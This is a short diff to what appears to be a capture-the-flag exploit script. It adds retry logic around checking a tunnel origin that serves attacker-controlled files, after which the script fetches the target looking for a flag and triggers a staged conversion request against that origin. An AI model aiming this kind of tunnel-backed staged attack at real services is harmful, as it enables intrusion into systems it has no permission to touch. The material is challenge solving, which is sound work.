@@ -49,7 +49,18 @@ while time.time()<deadline:
     if m: ORIGIN=m.group(); break
   elif cf.poll() is not None: break
 if not ORIGIN: raise SystemExit('NO_TUNNEL')
-print('ORIGIN='+ORIGIN,flush=True); st,h,b=get(ORIGIN+'/source.png'); print('TUNNEL_SOURCE',st,len(b),flush=True); assert b==SOURCE
+print('ORIGIN='+ORIGIN,flush=True)
+last=None
+for attempt in range(20):
+  try:
+    st,h,b=get(ORIGIN+'/source.png',timeout=10)
+    print('TUNNEL_SOURCE',st,len(b),'attempt',attempt+1,flush=True)
+    if b != SOURCE: raise RuntimeError('tunnel source mismatch')
+    break
+  except Exception as e:
+    last=e; print('TUNNEL_RETRY',attempt+1,repr(e),flush=True); time.sleep(2)
+else:
+  raise SystemExit('TUNNEL_UNREADY '+repr(last))
 st,h,b=get(TARGET+'/'); print('TARGET_ROOT',st,len(b),flush=True); m=FLAG.search(b)
 if m: print('FLAG='+m.group().decode(),flush=True); raise SystemExit(0)
 f=convert(ORIGIN+'/stage1?x='+str(time.time_ns()),1)
